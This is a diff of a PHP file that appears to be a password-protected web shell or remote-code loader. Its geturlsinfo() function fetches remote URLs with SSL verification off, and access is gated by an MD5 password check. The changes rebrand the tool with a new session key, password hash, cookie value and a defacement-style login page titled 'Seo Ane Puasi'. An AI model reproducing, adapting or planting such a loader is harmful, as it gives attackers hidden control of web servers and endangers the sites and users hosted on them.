@@ -16,8 +16,8 @@ function geturlsinfo($url) {
         curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
 
         // Set cookies using session if available
-        if (isset($_SESSION['coki'])) {
-            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
+        if (isset($_SESSION['SAP'])) {
+            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['SAP']);
         }
 
         $url_get_contents_data = curl_exec($conn);
@@ -39,15 +39,14 @@ function is_logged_in()
 {
     return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
 }
-
 // Check if the password is submitted and correct
 if (isset($_POST['password'])) {
     $entered_password = $_POST['password'];
-    $hashed_password = '8f8e25b5570c4cb6a43c968c3546704e'; // Replace this with your MD5 hashed password
+    $hashed_password = '4005dd881e9f948b8356b4aaea2a5a07'; // Replace this with your MD5 hashed password
     if (md5($entered_password) === $hashed_password) {
         // Password is correct, store it in session
         $_SESSION['logged_in'] = true;
-        $_SESSION['coki'] = 'asu'; // Replace this with your cookie data
+        $_SESSION['SAP'] = 'janco'; // Replace this with your cookie data
     } else {
         // Password is incorrect
         echo "Incorrect password. Please try again.";
@@ -64,14 +63,18 @@ if (is_logged_in()) {
     <!DOCTYPE html>
     <html>
     <head>
-        <title>L</title>
+        <title>Seo Ane Puasi</title>
     </head>
     <body>
+        <center>
+        <img src="https://i.ibb.co/dfscZXp/ane-puasi.png" />
+        <body style="background-color:black;">
         <form method="POST" action="">
-            <label for="password">P:</label>
+            <label for="password">Password:</label>
             <input type="password" id="password" name="password">
-            <input type="submit" value="L">
+            <input type="submit" value="Touch Me!">
         </form>
+        </center>
     </body>
     </html>
     <?php
